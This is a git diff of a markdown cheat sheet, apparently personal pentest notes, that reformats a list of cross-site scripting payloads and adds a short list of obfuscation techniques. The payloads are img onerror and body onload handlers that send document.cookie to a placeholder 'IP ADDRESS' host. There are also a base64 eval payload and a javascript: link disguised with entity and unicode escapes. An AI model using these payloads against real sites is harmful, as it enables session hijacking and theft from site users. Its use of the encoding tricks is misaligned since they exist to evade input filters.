@@ -103,13 +103,16 @@
 ## EXAMPLE PAYLOADS
 
 ---
-```<img src="x" onerror="alert('test')">```
-```<img src=x onerror="fetch('IP ADDRESS')">```
-```<img src=x onerror="window.location='http://IP ADDRESS/?cookie='+document.cookie;">```
-```username=<body onload=\"new Image().src='http://IP ADDRESS?c='+document.cookie;\">```
+-  ```<img src="x" onerror="alert('test')">```
+-  ```<img src=x onerror="fetch('IP ADDRESS')">```
+-  ```<img src=x onerror="window.location='http://IP ADDRESS/?cookie='+document.cookie;">```
+-  ```username=<body onload=\"new Image().src='http://IP ADDRESS?c='+document.cookie;\">```
 
-fetch('http://IP ADDRESS/?c=' + document.cookie)
-<svg onload="eval(atob('BASE64 ENCODE PAYLOAD'))">
+-  ```fetch('http://IP ADDRESS/?c=' + document.cookie)``` ENCODE -> ```<svg onload="eval(atob('BASE64 ENCODE PAYLOAD'))">```
 
-ENCODED - > base64 playload -> pop up
-<a href=ja&#x0D;vascript&colon;\u0065val(\u0061tob("YWxlcnQoInhzcyIp"))>test</a>
+## Obfuscation Techniques
+- HTML entity encoding → `&#x0D;`
+- Unicode escaping → `\u0065`
+- Base64 encoding → `atob()`
+- Dynamic execution → `eval()`
+-  ```<a href=ja&#x0D;vascript&colon;\u0065val(\u0061tob("YWxlcnQoInhzcyIp"))>test</a>```
